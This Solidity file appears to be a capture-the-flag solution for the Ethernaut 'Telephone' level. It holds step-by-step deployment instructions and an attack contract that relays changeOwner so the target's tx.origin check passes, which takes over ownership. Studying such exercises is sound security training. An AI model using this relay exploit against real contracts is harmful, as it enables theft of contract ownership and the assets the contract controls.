/*
Tools needed for this level:
- Console
- Remix IDE

1. Copy the Telephone contract to Remix IDE. This is needed for being able to import the code on this file. 
No need to deploy Telephone.sol.
2. Deploy this contract (TelephoneAttack.sol) with Remix using the Injected Web3 environment
passing Ethernaut's Telephone contract address to the constructor.
3.- Execute the changeOwner function passing the address you want to become the new owner.
4.- Verify if you're the new owner on the console:
        await contract.owner()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {
	Telephone public victimContract;

	// Get an instance of the copy of the Telephone contract we have deployed
	constructor(address victimContractAddr) public {
		victimContract = Telephone(victimContractAddr);
	}

	// By calling this function, the tx.origin will be our address
	// and the msg.sender will be this contract's address
	// and we'll be able to pass succesfully the if statement:
	// if (tx.origin != msg.sender)
	function changeOwner(address _newOwner) public {
		victimContract.changeOwner(_newOwner);
	}
}
